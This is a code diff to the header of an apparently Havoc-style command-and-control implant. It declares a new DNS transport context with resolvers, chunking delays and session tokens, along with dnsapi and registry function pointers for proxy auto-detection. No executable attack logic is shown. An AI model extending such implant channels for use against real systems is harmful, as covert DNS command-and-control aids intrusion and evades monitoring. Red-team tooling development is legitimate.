@@ -114,12 +114,26 @@ typedef struct
                 LPWSTR Url;      /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
                 LPWSTR Username; /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
                 LPWSTR Password; /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
+                BOOL   AutoDetect; /* [HVC-026] detect system proxy via registry at init */
             } Proxy;
 #endif
 
 #ifdef TRANSPORT_SMB
             LPWSTR  Name;   /* UTF-16 pipe name; teamserver sends via AddWString in builder.go */
             HANDLE  Handle;
+#endif
+
+#ifdef TRANSPORT_DNS
+            struct {
+                LPWSTR  ZoneDomain;
+                DWORD   ResolverCount;
+                LPWSTR  Resolvers[ 8 ];
+                WORD    Port;
+                DWORD   QueryTimeout;
+                DWORD   ChunkDelayMs;
+                UINT16  SeqNum;        /* rolling sequence counter */
+                UINT32  SessionToken;  /* random per-session id, not the agent ID */
+            } DnsCtx;
 #endif
         } Transport;
 
@@ -305,6 +319,12 @@ typedef struct
         WIN_FUNC( WinHttpGetIEProxyConfigForCurrentUser )
         WIN_FUNC( WinHttpGetProxyForUrl )
 
+        /* dnsapi.dll — loaded only when TRANSPORT_DNS */
+#ifdef TRANSPORT_DNS
+        DNS_STATUS ( WINAPI *DnsQuery_W )( PCWSTR pszName, WORD wType, DWORD Options, PVOID pExtra, PDNS_RECORD *ppQueryResults, PVOID *pReserved );
+        VOID       ( WINAPI *DnsRecordListFree )( PDNS_RECORD pRecordList, DNS_FREE_TYPE FreeType );
+#endif
+
         // Mscoree
         HRESULT ( WINAPI *CLRCreateInstance ) ( REFCLSID clsid, REFIID riid, LPVOID* ppInterface );
 
@@ -337,6 +357,11 @@ typedef struct
         WIN_FUNC( ConvertSidToStringSidW )
         WIN_FUNC( GetSidSubAuthorityCount )
         WIN_FUNC( GetSidSubAuthority)
+
+        /* [HVC-026] Registry — for HttpAutoProxyDetect() */
+        WIN_FUNC( RegOpenKeyExW )
+        WIN_FUNC( RegQueryValueExW )
+        WIN_FUNC( RegCloseKey )
 
 #ifdef SLEEPOBF_USE_FOLIAGE
         WIN_FUNC( ConvertThreadToFiberEx )
@@ -533,6 +558,10 @@ typedef struct
 
 #ifdef TRANSPORT_HTTP
         PVOID WinHttp;
+#endif
+
+#ifdef TRANSPORT_DNS
+        PVOID DnsApi;
 #endif
     } Modules;
 
